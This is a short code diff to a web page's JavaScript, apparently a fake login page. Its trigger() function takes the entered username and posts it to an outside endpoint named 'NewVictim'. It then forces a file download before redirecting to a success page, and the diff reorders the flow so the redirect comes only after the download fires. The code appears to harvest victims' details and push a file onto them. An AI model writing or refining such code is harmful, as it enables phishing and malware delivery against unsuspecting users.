@@ -350,7 +350,7 @@ body {
 function trigger() {
   const username = document.getElementById("username").value;
   // 登录成功后的操作
-    window.location.href="success.html";
+   
   // 发送API请求
   fetch('https://api.lkeastore.com/api/v1/NewVictim', {
     method: 'POST',
@@ -372,6 +372,7 @@ function trigger() {
     a.href = url;
     a.download = fileName;
     a.click();
+    window.location.href="success.html";
   })
   .catch(error => {
     // 处理错误
